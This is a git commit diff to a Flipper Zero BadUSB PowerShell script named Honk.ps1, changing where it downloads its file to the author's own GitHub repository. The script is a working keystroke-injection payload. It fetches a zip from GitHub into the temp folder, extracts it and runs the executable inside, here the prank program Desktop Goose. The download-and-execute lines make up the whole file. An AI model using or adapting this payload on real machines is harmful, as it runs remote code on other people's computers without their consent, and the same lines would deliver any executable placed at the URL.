ef3011a7e2f64e4593948c9f4319c81c2c793960
Joel N. Reboia <70518069+J-Reboia@users.noreply.github.com>
2026-03-28 10:47:33 +0100

    Changed github url to my own repo

--- Flipper/BadUsb/Honk/Honk.ps1
+++ Flipper/BadUsb/Honk/Honk.ps1
@@ -1,4 +1,4 @@
 Start-Process "$env:TEMP\H\GooseDesktop.exe" -WorkingDirectory "$env:TEMP\H"
-iwr -Uri "https://raw.githubusercontent.com/csandoval63/GooseDesktopRubberDucky/6f58ce98040f7904d934f3a376b491dab45dcd22/Desktop%20Goose%20v0.21.zip" -OutFile "$env:TEMP\H.zip";
+iwr -Uri "https://github.com/J-Reboia/TheFunHouse/raw/refs/heads/main/Misc/Desktop_Goose_v0.21.zip" -OutFile "$env:TEMP\H.zip";
 Expand-Archive "$env:TEMP\H.zip" -Dest "$env:TEMP\H" -Force;
 (New-Object -ComObject Shell.Application).ShellExecute("$env:TEMP\H\GooseDesktop.exe");
